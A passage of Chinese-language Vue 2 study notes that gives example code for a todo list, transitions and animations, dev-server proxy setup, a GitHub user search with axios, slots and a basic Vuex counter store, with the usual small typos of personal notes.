<template>
    <div class="todo-footer" v-show="totalTodo">
      <label>
        <!-- <input type="checkbox" :checked="totalDone === totalTodo && totalTodo>0"/> -->

        <!-- v-model 默认拿的就是 checkbox的value值 -->
        <input type="checkbox" v-model="isAll"/>

      </label>
      <span>
        <span>已完成{{totalDone}}</span> / 全部{{totalTodo}}
      </span>
      <button class="btn btn-danger" @click="clearDone">清除已完成任务</button>
    </div>
</template>
<script>

export default {
  name:'MyFooter',
  data(){
      return {
          name:"fgcy",
          age:12,
          sex:'未知'
      }
  },
  props:['todos'],

  computed:{
      totalDone(){
          let count=0;
          this.todos.forEach(obj => {
              if(obj.done === true){
                  count++;
              }
          });
          return count;
      },
      totalTodo(){
          return this.todos.length;
      },
      isAll:{
          get(){
              return this.totalDone === this.totalTodo && this.totalTodo>0;
          },
          set(value){
              this.$emit('selectAll',value);
              // this.selectAll(value);
          }
      }
  },
  methods:{
      clearDone(){
          // this.doClear();
          this.$emit('doClear');
      }
  }
}
</script>
<!-- 没有加scoped -->
<style scoped>
.demo{
  background-color: aqua;
}
</style>

~~~



List.vue

~~~vue
<template>
  <ul class="todo-main">
    <Item 
        v-for="todoObj in todos" 
        :key="todoObj.id" 
        :todo="todoObj" 
    /> 

  </ul>
</template>
<script>
import Item from './Item.vue'
export default {
name:'List',
components:{
    Item
},
props:['todos'],

}
</script>
<!-- 没有加scoped -->
<style scoped>
.todo-main {
margin-left: 0px;
border: 1px solid #ddd;
border-radius: 2px;
padding: 0px;
}

.todo-empty {
height: 40px;
line-height: 40px;
border: 1px solid #ddd;
border-radius: 2px;
padding-left: 5px;
margin-top: 10px;
} 
</style>

~~~



Item.vue

~~~vue
<template>
  <li>
     <label>
       <input type="checkbox" :checked="todo.done" @change="changeFlag(todo.id)"/>
       <span v-show="!todo.isEdit">{{todo.title}}</span>
       <input 
       type="text" 
       v-model="todo.title" 
       v-show="todo.isEdit" 
       @blur="onBlur"
       ref="title"
       
       >
     </label>
     <button class="btn btn-danger" @click="doDelete(todo.id)">删除</button>
     <button class="btn btn-edit" @click="doEdit(todo)">编辑</button>
   </li>
</template>
<script>

export default {
name:'Item',
props:['todo'],
methods:{
   //改变勾选状态
   changeFlag(id){
    //  this.checkTodoFlag(id);
     this.$bus.$emit('checkTodoFlag',id)
   },

   // 删除
   doDelete(id){
      //  this.deleteTodo(id);
      this.$bus.$emit('deleteTodo',id)
   },

   //修改
   doEdit(todo){
     if(todo.hasOwnProperty('isEdit')){
         this.todo.isEdit=true;
     }else{
      this.$set(todo,'isEdit',true);
     }

     //这个$nextTick()是告诉vue 等渲染页面后在走里面的逻辑
     this.$nextTick(()=>{
      //一般是等到所有回调函数的逻辑走完后才渲染页面
      this.$refs.title.focus();
     });
   },



   onBlur(){
      this.todo.isEdit=false;
   }
}
}
</script>
<!-- 没有加scoped -->
<style scoped>
li {
list-style: none;
height: 36px;
line-height: 36px;
padding: 0 5px;
border-bottom: 1px solid #ddd;
}

li label {
float: left;
cursor: pointer;
}

li label li input {
vertical-align: middle;
margin-right: 6px;
position: relative;
top: -1px;
}

li button {
float: right;
display: none;
margin-top: 3px;
}

li:before {
content: initial;
}

li:last-child {
border-bottom: none;
}

li:hover {
background-color: #fff;
}

li:hover button{
display: block;
}
</style>

~~~







## vue中动画与过度

### 单元素 过度 与动画效果



Test.vue 动画

~~~vue
<template>
  <div>
    <button @click="isShow =!isShow">显示/隐藏</button>
    <transition appear name="hello">
      <h1 v-show="isShow">你好哇</h1>
    </transition>
</div>
</template>

<script>
export default {
    name:'Test',
 data(){
    return {
        isShow:true
    }
 }
}
</script>

<style>
h1{
    background-color: orange;
}

  .hello-enter-active{
   animation: atguigu 1s; 
  }

  .hello-leave-active{
   animation: atguigu 1s reverse; 
  }

@keyframes atguigu {
  from  {
    transform: translateX(-100%);
  }

  to{
    transform: translateX(0px);
  }
}
</style>
~~~



Test2.vue 过度

~~~vue
<template>
  <div>
    <button @click="isShow =!isShow">显示/隐藏</button>
    <transition appear name="hello">
      <h1 v-show="isShow">你好哇</h1>
    </transition>
</div>
</template>

<script>
export default {
    name:'Test',
 data(){
    return {
        isShow:true
    }
 }
}
</script>

<style>
h1{
    background-color: orange;
}

/* 进入的起点  /* 离开的终点 */*/
.hello-enter .hello-leave-to{
 transform: translateX(-100%);
}  

/* 进入的终点  离开的起点*/
.hello-enter-to .hello-leave{
  transform: translateX(0);
}

.hello-enter.active .hello-leave.active{
  transition: 0.5s linear;
}


</style>
~~~



App.vue

~~~vue
<template>
  <div>
    <Test/>
    <Test2/>
  </div>
  </template>
  
  <script>
  import Test from './components/Test.vue'
  import Test2 from './components/Test2.vue'
  
  
  export default {  
      components:{Test,Test2},
}
  
  </script>
  
  <style>
  /*base*/
  body {
    background: #fff;
  }
  
  .btn {
    display: inline-block;
    padding: 4px 12px;
    margin-bottom: 0;
    font-size: 14px;
    line-height: 20px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;
  }
  
  .btn-danger {
    color: #fff;
    background-color: #da4f49;
    border: 1px solid #bd362f;
  }

  .btn-edit {
    color: #fff;
    background-color: skyblue;
    border: 1px solid rgb(102, 153, 173);
    margin-right: 3px;
  }


  
  .btn-danger:hover {
    color: #fff;
    background-color: #bd362f;
  }
  
  .btn:focus {
    outline: none;
  }
  
  .todo-container {
    width: 600px;
    margin: 0 auto;
  }
  .todo-container .todo-wrap {
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
  }
  
  /*header*/
  
  /*main*/
  
  /*item*/
  
  /*footer*/
  .todo-footer {
    height: 40px;
    line-height: 40px;
    padding-left: 6px;
    margin-top: 5px;
  }
  
  .todo-footer label {
    display: inline-block;
    margin-right: 20px;
    cursor: pointer;
  }
  
  .todo-footer label input {
    position: relative;
    top: -1px;
    vertical-align: middle;
    margin-right: 5px;
  }
  
  .todo-footer button {
    float: right;
    margin-top: 5px;
  }
  
  </style>
~~~









### 多元素过度 transaction-group

Test2.vue

~~~vue
<template>
  <div>
    <button @click="isShow =!isShow">显示/隐藏</button>
    <transition-group appear name="hello">
      <h1 v-show="!isShow" key="1">你好哇</h1>
      <h1 v-show="isShow" key="2">你好呀！！！！</h1>
    </transition-group>
</div>
</template>

<script>
export default {
    name:'Test',
 data(){
    return {
        isShow:true
    }
 }
}
</script>

<style>
h1{
    background-color: orange;
}

/* 进入的起点  /* 离开的终点 */*/
.hello-enter .hello-leave-to{
 transform: translateX(-100%);
}  

/* 进入的终点  离开的起点*/
.hello-enter-to .hello-leave{
  transform: translateX(0);
}

.hello-enter.active .hello-leave.active{
  transition: 0.5s linear;
}


</style> 
~~~



---

![image-20221023222951317](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210232229614.png)

----





### 使用 第三方动画

> https://animate.style/

`npm install animate.css`

App.vue

~~~vue
<template>
  <div>
    <Test/>
    <Test2/>
    <Test3/>
  </div>
  </template>
  
  <script>
  import Test from './components/Test.vue'
  import Test2 from './components/Test2.vue'
  import Test3 from './components/Test3.vue'
  
  
  export default {  
      components:{Test,Test2,Test3},
}
  
  </script>
  
  <style>
  /*base*/
  body {
    background: #fff;
  }
  
  .btn {
    display: inline-block;
    padding: 4px 12px;
    margin-bottom: 0;
    font-size: 14px;
    line-height: 20px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;
  }
  
  .btn-danger {
    color: #fff;
    background-color: #da4f49;
    border: 1px solid #bd362f;
  }

  .btn-edit {
    color: #fff;
    background-color: skyblue;
    border: 1px solid rgb(102, 153, 173);
    margin-right: 3px;
  }


  
  .btn-danger:hover {
    color: #fff;
    background-color: #bd362f;
  }
  
  .btn:focus {
    outline: none;
  }
  
  .todo-container {
    width: 600px;
    margin: 0 auto;
  }
  .todo-container .todo-wrap {
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
  }
  
  /*header*/
  
  /*main*/
  
  /*item*/
  
  /*footer*/
  .todo-footer {
    height: 40px;
    line-height: 40px;
    padding-left: 6px;
    margin-top: 5px;
  }
  
  .todo-footer label {
    display: inline-block;
    margin-right: 20px;
    cursor: pointer;
  }
  
  .todo-footer label input {
    position: relative;
    top: -1px;
    vertical-align: middle;
    margin-right: 5px;
  }
  
  .todo-footer button {
    float: right;
    margin-top: 5px;
  }
  
  </style>
~~~



Test.vue

~~~vue
<template>
  <div>
    <button @click="isShow =!isShow">显示/隐藏</button>
    <transition appear name="hello">
      <h1 v-show="isShow">你好哇</h1>
    </transition>
</div>
</template>

<script>
export default {
    name:'Test',
 data(){
    return {
        isShow:true
    }
 }
}
</script>

<style>
h1{
    background-color: orange;
}

  .hello-enter-active{
   animation: atguigu 1s; 
  }

  .hello-leave-active{
   animation: atguigu 1s reverse; 
  }

@keyframes atguigu {
  from  {
    transform: translateX(-100%);
  }

  to{
    transform: translateX(0px);
  }
}
</style>
~~~



Test2.vue

~~~vue
<template>
  <div>
    <button @click="isShow =!isShow">显示/隐藏</button>
    <transition-group appear name="hello">
      <h1 v-show="!isShow" key="1">你好哇</h1>
      <h1 v-show="isShow" key="2">你好呀！！！！</h1>
    </transition-group>
</div>
</template>

<script>
export default {
    name:'Test',
 data(){
    return {
        isShow:true
    }
 }
}
</script>

<style>
h1{
    background-color: orange;
}

/* 进入的起点  /* 离开的终点 */*/
.hello-enter .hello-leave-to{
 transform: translateX(-100%);
}  

/* 进入的终点  离开的起点*/
.hello-enter-to .hello-leave{
  transform: translateX(0);
}

.hello-enter.active .hello-leave.active{
  transition: 0.5s linear;
}


</style>
~~~



Test3.vue

~~~vue
<template>
  <div>
    <button @click="isShow =!isShow">显示/隐藏</button>
    <transition-group 
    appear 
    name="animate__animated animate__bounce"
    enter-active-class="animate__swing"
    leave-active-class="animate__backOutUp"
    >
      <h1 v-show="!isShow" key="1">你好哇</h1>
      <h1 v-show="isShow" key="2">你好呀！！！！</h1>
    </transition-group>
</div>
</template>

<script>
import 'animate.css'
export default {
    name:'Test',
 data(){
    return {
        isShow:true
    }
 }
}
</script>

<style>
h1{
    background-color: orange;
}

</style>
~~~

----

![image-20221023224731612](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210232247724.png)

---



Vue封装的过度与动画
1.作用

在插入、更新或移除DOM元素时  在合适的时候给元素添加样式类名

2.图示：

---

![image-20221023223850188](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210232242724.png)

----

3.写法
准备好样式
	元素讲入的样式:
		1.v-enter：进入的起点

​		2.v-enter-active：进入过程中

​		3.v-enter-to：进入的终点

元素离开的样式

​		1.v-leave：离开的起点
​		2.v-leave-active：离开过程中
​		3.vleave-to：离开的终点

2.使用 `<transition> ` 包裹要过度的元素，并配置ame属性：





~~~html
<transition name-"hello">
	<h1 v-show="isShow">你好啊！</h1>
</transition>    
~~~

3.备注：若有多个元素需要过度，则需要使用`<transition-group>`：且每个元素都要指定key 值





# 第 4 章：Vue 中的 ajax



## vue脚手架配置代理

### 配置代理方式一：

> npm i axios



**跨域问题：**

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)
}).$mount('#app')

~~~



App.vue

~~~vue
<template>
  <div>
      <button @click="getStudent">获取学生信息</button>
  </div>
  </template>
  
  <script>

  import axios from 'axios'
  export default {  
      methods:{
        getStudent(){
          axios.get('http://localhost:5000/students').then(
            response=>{
                console.log('请求成功',response.data);
            },
            error=>{
              console.log('请求失败',err.message)
            }

          );
        }
      }
}  
  </script>
~~~

错误如下：

----

![image-20221024210732855](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210242107463.png)

-----







**解决：**

方式一：

----

![image-20221024210340499](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210242106783.png)

-----





vue.config.js

~~~~~js
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
  transpileDependencies: true,
  /*关闭语法检查*/
  lintOnSave:false  ,

  //开启代理服务器 方式一
  devServer: {
    proxy: 'http://localhost:5000'
  }
});
~~~~~



-----

![image-20221024211038701](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210242110992.png)

-----



当publlic目录下有一个 `student` 文件时：不会走接口，直接返回student文件的内容

students：

~~~
aaaaaaaaaaaaaa
~~~

----

![image-20221024211631026](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210242116346.png)

-----

> 问题：
>
> 1. 不能灵活地控制走不走代理
>
> 2. 只能配置一台代理服务器







### 配置代理方式二：

App.vue

~~~vue
<template>
  <div>
      <button @click="getStudent">获取学生信息</button>
      <button @click="getCar">获取学校信息</button>
  </div>
  </template>
  
  <script>

  import axios from 'axios'
  export default {  
      methods:{
        getStudent(){
          axios.get('http://localhost:8080/atguigu/students').then(
            response=>{
                console.log('请求成功',response.data);
            },
            error=>{
              console.log('请求失败',err.message)
            }

          );
        },
        getCar(){
          axios.get('http://localhost:8080/demo/cars').then(
            response=>{
                console.log('请求成功',response.data);
            },
            error=>{
              console.log('请求失败',err.message)
            }

          );
        }
      }
}  
  </script>
~~~



vue.config.js

~~~js
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
  transpileDependencies: true,
  /*关闭语法检查*/
  lintOnSave:false  ,

  //开启代理方式一：
/*   devServer: {
    proxy: 'http://localhost:5000'
  } */




  // 开启代理服务器方式二:
  devServer: {
    proxy: {
      '/atguigu': {
        target: 'http://localhost:5000',

      //不进行路径重写的话，会带上自己定义的前缀，404
        pathRewrite:{'^/atguigu':''}
        // ws: true,   用于支持 websocket
        // changeOrigin: true 用于控制请求头中的host值 默认为真 为真时请求的服务器是什么端口 那么这台代理服务器就会将自己的host改为什么端口   
      },
      '/demo': {
        target: 'http://localhost:5001',
        pathRewrite:{'^/demo':''}
      }
    }
  }
})

~~~



### 小结：

方法一
在vue.config.js中添加如下配置：

~~~js
devServer:{
    proxy："http://localhost：5000"
}
~~~

说明：

1.优点：配置简单，请求资源时直接发给前端（8080）即可

2.缺点：不能配置多个代理，不能灵活的控制请求是否走代理

3.工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器（优先匹配前端资源）







方法二：

编写vue.config.jis配置具体代理规则

~~~js
module.exports ={
  devServer: {
    proxy: {
      '/atguigu': {
        target: 'http://localhost:5000',

      //不进行路径重写的话，会带上自己定义的前缀，404
        pathRewrite:{'^/atguigu':''}
        // ws: true,   用于支持 websocket
        // changeOrigin: true 用于控制请求头中的host值 默认为真 为真时请求的服务器是什么端口 那么这台代理服务器就会将自己的host改为什么端口   
      },
      '/demo': {
        target: 'http://localhost:5001',
        pathRewrite:{'^/demo':''}
      }
    }
  }
}
/*
changeOrigin设置为true时，服务器收到的请求头中的host为，1ocalhost:5000
change0rigin设置为fa1se时，服务器收到的请求头中的host为，1ocalhost：8088
changeOrigin默认值为true
*/
~~~

说明：
1.优点：可以配置多个代理，且可以灵活的控制请求是否走代理
2.缺点：配置略微繁琐，请求资源时必须加前缀







## github搜索列表





axios 通用的 Ajax 请求库, 官方推荐，使用广泛



github的一个获取用户列表的接口地址：做了cors

https://api.github.com/search/users?q=xxx



main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false

//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App),
  beforeCreate(){
    Vue.prototype.$bus=this;
  }
}).$mount('#app')
~~~

App.vue

~~~vue
<template>

  <div class="container">
    <Search/>
    <List/>
</div>
  </template>
  
  <script>

import Search from './components/Search.vue'
import List from './components/List.vue'

  export default {  
      name:'App',
      components:{Search,List}
}
  
  </script>

~~~



Search.vue

~~~vue
<template>
      <section class="jumbotron">
      <h3 class="jumbotron-heading">Search Github Users</h3>
      <div>
        <input type="text" placeholder="enter the name you search" v-model="keyWord"/>&nbsp;
        
        <button @click="getMsg">Search</button>
      </div>
    </section>
</template>

<script>
import axios from 'axios';
export default {
    name:'Search',
    data(){
        return{
            keyWord:''
        }
    },
methods:{
    getMsg(){

        this.$bus.$emit('getData',{isFirst:false,isLoading:true,errMsg:'',users:[]});
        //es6的模板字符串
        axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
            response=>{
                this.$bus.$emit('getData',{isLoading:false,errMsg:'',users:response.data.items});
            },
            error=>{
                this.$bus.$emit('getData',{isLoading:false,errMsg:error.message,users:[]});
            }
        );
    }
}
}
</script>

<style>

</style>
~~~

List.vue

~~~vue
<template>
   <div class="row">
    <div class="card" v-for="user in info.users" :key="user.id" v-show="info.users.length">
        <a :href="user.html_url" target="_blank">
          <img :src="user.avatar_url" style='width:100px'/>
        </a>
        <p class="card-text">{{user.login}}</p>
      </div>
      <h1 v-show="info.isFirst">Welcome</h1>
      <h1 v-show="info.isLoading">Loading.........</h1>
      <h1 v-show="info.errMsg">{{info.errMsg}}</h1>
    </div>
</template>

<script>
export default {
    name:'List',
    data(){
        return{
          info:{
            users:[],
              isFirst:true,
              isLoading:false,
              errMsg:''
          }
        }
    },
    mounted(){
        this.$bus.$on('getData',(info)=>{
            //es6 对象 同名属性合并
             this.info = {...this.info,...info}
        })
    }
}
</script>

<style>

.album {
  min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;
  padding-bottom: 3rem;
  background-color: #f7f7f7;
}

.card {
  float: left;
  width: 33.333%;
  padding: .75rem;
  margin-bottom: 2rem;
  border: 1px solid #efefef;
  text-align: center;
}

.card > img {
  margin-bottom: .75rem;
  border-radius: 100px;
}

.card-text {
  font-size: 85%;
}
</style>
~~~





## vue-resource

 vue 插件库, vue1.x 使用广泛，官方已不维护。







## slot 插槽



### 默认插槽

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)

}).$mount('#app')

~~~



App.vue

~~~vue
<template>

  <div class="container">
  <Category :dataList="games" title="游戏">
    <img src="https://s3.ax1x.com/2021/01/16/srJ1q0.jpg" alt="">
  </Category>

  <Category title="美食">
    <ul>
        <li v-for="(item,index) in foods" :key="index" v-text="item"></li>
    </ul>
  </Category>

  <Category :dataList="films" title="电影">
      <video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
  </Category>

  <Category title="无"/>


</div>
  </template>
  <!-- 

    训频：http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4
    图片：https://s3.ax1x.com/2021/01/16/srJ1q0.jpg
   -->
  <script>

import Category from './components/Category.vue';
  export default {  
      name:'App',
      components:{Category},
      data(){
        return{
          foods:['火锅','烧烤','小龙虾','牛排'],
          games:['红色警戒','穿越火线','劲舞团','超级玛朋'],
          films:['《教父》','《尚硅谷》','《拆弹专家》' ,'《你好，李焕英》']
        }
      }
}
  
  </script>
<style scoped>
.container{
  display: flex;
  justify-content: space-around;
}

img{
  width: 100%;
}

video{
  width: 100%;
}
</style>
~~~



Category.vue

~~~vue
<template>
  <div class="category">
    <h2>{{title}}</h2>
    <slot>当没有在标签体写东西时，默认出现这行字</slot>
  </div>
</template>

<script>

export default {
    name:'Category',
    props:['title']
}
</script>

<style scoped>
.category{
    background-color: bisque;
    width: 200px;
    height: 300px;
}
h2{
    text-align: center;
    background-color: orange;
}
</style>
~~~



----

![image-20221025213129267](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210252131804.png)

-----











### 具名插槽

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)

}).$mount('#app')
~~~



App.vue

~~~vue
<template>

  <div class="container">
  <Category  title="游戏">
    <img slot="top" src="https://s3.ax1x.com/2021/01/16/srJ1q0.jpg" alt="">
    <a href="http://www.baidu.com" slot="footer">更多</a>
  </Category>

  <Category title="美食">
    <ul slot="top">
        <li v-for="(item,index) in foods" :key="index" v-text="item"></li>
    </ul>
    <div slot="footer">
      <a href="http://www.baidu.com">深夜</a>
      <a href="http://www.baidu.com">放毒</a>
    </div>
  </Category>

  <Category :dataList="films" title="电影">
      <video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4" slot="top"></video>
      <template v-slot:footer>
        <div>
        <a href="http://www.baidu.com">来</a>
        <a href="http://www.baidu.com">玩</a>
        <a href="http://www.baidu.com">啊</a>
        </div>
      </template>
  </Category>

  <Category title="无"/>


</div>
  </template>
  <!-- 

    训频：http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4
    图片：https://s3.ax1x.com/2021/01/16/srJ1q0.jpg
   -->
  <script>

import Category from './components/Category.vue';
  export default {  
      name:'App',
      components:{Category},
      data(){
        return{
          foods:['火锅','烧烤','小龙虾','牛排'],
          games:['红色警戒','穿越火线','劲舞团','超级玛朋'],
          films:['《教父》','《尚硅谷》','《拆弹专家》' ,'《你好，李焕英》']
        }
      }
}
  
  </script>
<style scoped>
.container{
  display: flex;
  justify-content: space-around;
}

img{
  width: 100%;
}

video{
  width: 100%;
}
</style>
~~~



Category.vue

~~~vue
<template>
  <div class="category">
    <h2>{{title}}</h2>
    <slot name="top">插槽一</slot>
    <slot name="footer">插槽二</slot>
  </div>
</template>

<script>

export default {
    name:'Category',
    props:['title']
}
</script>

<style scoped>
.category{
    background-color: bisque;
    width: 200px;
    height: 300px;
}

h2{
    text-align: center;
    background-color: orange;
}
</style>
~~~

-----

![image-20221025214848350](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210252148577.png)

------





### 作用域插槽

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)

}).$mount('#app')

~~~



App.vue

~~~vue
<template>

  <div class="container">
  <Category  title="游戏">
        <!-- 结构赋值 -->
        <template scope="{games}">
            <ul>
                <li v-for="g,index in games" :key="index">{{g}}</li>
            </ul>
      </template>
  </Category>

  <Category title="美食">
        <!-- 结构赋值 -->
        <template scope="{games}">
            <ol>
                <li v-for="g,index in games" :key="index">{{g}}</li>
            </ol>
      </template>
  </Category>

  <Category :dataList="films" title="电影">
        <!-- 结构赋值 -->
        <template scope="{games}">
            <ul>
                <h2 v-for="g,index in games" :key="index">{{g}}</h2>
            </ul>
      </template>
  </Category>

  <Category title="无"/>


</div>
  </template>
  <script>

import Category from './components/Category.vue';
  export default {  
      name:'App',
      components:{Category},

}
  
  </script>
<style scoped>
.container{
  display: flex;
  justify-content: space-around;
}

img{
  width: 100%;
}

video{
  width: 100%;
}
</style>
~~~



Category.vue

~~~Vue
<template>
  <div class="category">
    <h2>{{title}}</h2>
    <slot :games="games">默认显示</slot>
  </div>
</template>

<script>

export default {
    name:'Category',
    props:['title'],
    data(){
        return{
          foods:['火锅','烧烤','小龙虾','牛排'],
          games:['红色警戒','穿越火线','劲舞团','超级玛朋'],
          films:['《教父》','《尚硅谷》','《拆弹专家》' ,'《你好，李焕英》']
        }
      }
}
</script>

<style scoped>
.category{
    background-color: bisque;
    width: 200px;
    height: 300px;
}

h2{
    text-align: center;
    background-color: orange;
}
</style>
~~~







插槽
1.作用：让公组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于  父组件 ==> 子组件
2.分类：默认插槽、具名插槽、作用域插槽

3.使用方式：

1.默认插槽

~~~html
父组件中:
<Category>
    <div>html结构1</div>
</Category>

子组件中:
<template>
    <div>
        <!--定义插槽-->
        <s1ot>插槽默认内容...</s1ot>
    </div>
</template>
~~~











2.具名插槽：

~~~html
父组件中
<Category>
    <template slot="center"
        <div>htm1结构1</div>
    </template>

    <template v-slot:footer>
        <div>htm1结构2</div>
    </template>
</Category>
~~~



子组件中，

~~~html
<template>
    <div>
        <!--定义插槽-->
        <slot name-"center"> 插槽默认内容...</s1ot>
        <slot name-"footer"> 插槽默认内容...</s1ot>
    </div>
</template>
~~~





3 作用域插槽：

1 理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。(games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定)

2.具体编码 :

~~~html
父组件中
<Category>
    <template scope="scopeData">
         <!--生成的是ul列表-->
        <u1>
            <1i v-for="g in scopeData.games"：key="g">{{g}}</1i>
        </u1>
    </template>
</Category>

<Category>
    <template slot-scope="scopeData">
        <!--生成的是h4标题-->
        <h4 v-for-"g in scopeData.games"：key-"g">{{g}}</h4>
    </template>
</Category>



子组件中:
<template>
<div>
    <slot：games="games"></s1ot>
/div>
</template>
    
<script>
export default{
    name:'Category',
    props:['title'],
    //数据在子组件自身
    data(){
        peturn {
            games：["红色警戒"，"穿越火线"，"劲舞团"，"超级玛丽"]
        }
    }
}
</script>
~~~





# 第 5 章：vuex

##  vuex 是什么 

1. 概念：专门在 Vue 中实现集中式状态（数据）管理的一个 Vue 插件，对 vue 应 用中多个组件的共享状态进行集中式的管理（读/写）

   也是一种组件间通信的方式，且适用于任意组件间通信。 

1. Github 地址: https://github.com/vuejs/vuex







-----

![image-20221025223434845](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210252234071.png)

------





----

![image-20221025223715621](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210252237695.png)

----





## 什么时候使用 Vuex 

1. 多个组件依赖于同一状态
2. 来自不同组件的行为需要变更同一状态









### **Vuex工作原理图：**

----

![image-20221025231123494](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210252311731.png)

----







版本问题：

---

![image-20221026210238943](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210262102395.png)

----

> npm i vuex@3





### 搭建vuex环境

创建文件：src/store/index.js

~~~~js
//引入Vue核心库
import Vue from 'vue'
//引入vuex 
import Vuex from 'vuex'

//应用Vuex插件
Wue.use(Vuex)
//准备actions对象 响应组件中用户的动作
const actions ={}

//准备mutations对象 修改state中的数据
const mutations ={}

//准备state对象 保存具体的数据
const state ={}

//创建并暴露store 
export default new Vuex.Store({
    actions,mutations,state
})

~~~~









## 求和案例 纯vue版



main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'
import App from './App.vue'

//关闭vue的生产提示
Vue.config.productionTip = false



//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App)

}).$mount('#app')
~~~





App.vue

~~~vue
<template>
  <div class="container">
        <Count/>
  </div>
  </template>

  <script>

import Count from './components/Count.vue'
  export default {  
      name:'App',
      components:{Count},


}
  
  </script>
<style>
button{
  margin-left: 5px;
}
</style>
~~~



Count.vue

~~~vue
<template>
<div>
  <h1>当前求和为：{{sum}}</h1>

  <select v-model.number="n">
    <option :value="1">1</option>
    <option :value="2">2</option>
    <option :value="3">3</option>
  </select>

  <button @click="increament">+</button>
  <button @click="decreament">-</button>
  <button @click="increamentOdd">当前求和为奇数再加</button>
  <button @click="increamentWait">歇一下再加</button>
</div>
</template>

<script>

export default {
    name:'Count',
    data(){
        return{
          n:1,
          sum:0
        }
      },
      methods:{
        increament(){
            this.sum+=this.n;
        },
        decreament(){
            this.sum-=this.n;
        },
        increamentOdd(){
          if(this.sum  % 2 ){
              this.sum+=this.n;
          }
        },
        increamentWait(){
          setTimeout(() => {
              this.sum+=this.n;
            }, 500);
        },
      }
}
</script>
~~~



## 求和案例 简单vuex版

main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'
import App from './App.vue'


import store from './store' //默认找index.js

//关闭vue的生产提示
Vue.config.productionTip = false


//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App),
  store

}).$mount('#app')
~~~



在src下创一个目录 store ，创建一个文件 index.js

index.js

~~~js
//该文件用于创建 vuex中最核心的store


import Vuex from 'vuex'

import Vue from 'vue'

Vue.use(Vuex);

//准备action 用于响应组件中的动作
const actions={
    //有逻辑在这里处理 mutations只负责 修改数据
    addOdd(context,value){
        if(context.state.sum % 2){
            context.commit('ADD',value);
        }
    },
    addWait(context,value){
       setTimeout(() => {
        context.commit('ADD',value);
       }, 500);
    }
}


//准备mutations 用于操作数据（state）
const mutations={
    ADD(state,value){
        state.sum+=value;
    },
    SUBSTRACT(state,value){
        state.sum-=value;
    }
}


//准备state 用于存储数据
const state ={
   sum:0
}


// 创建 并暴露 store
export default   new Vuex.Store({
    actions,
    mutations,
    state
});
~~~



Count.vue

~~~vue
<template>
<div>
  <h1>当前求和为：{{$store.state.sum}}</h1>

  <select v-model.number="n">
    <option :value="1">1</option>
    <option :value="2">2</option>
    <option :value="3">3</option>
  </select>

  <button @click="increament">+</button>
  <button @click="decreament">-</button>
  <button @click="increamentOdd">当前求和为奇数再加</button>
  <button @click="increamentWait">歇一下再加</button>
</div>
</template>

<script>

export default {
    name:'Count',
    data(){
        return{
          n:1,
          sum:0
        }
      },
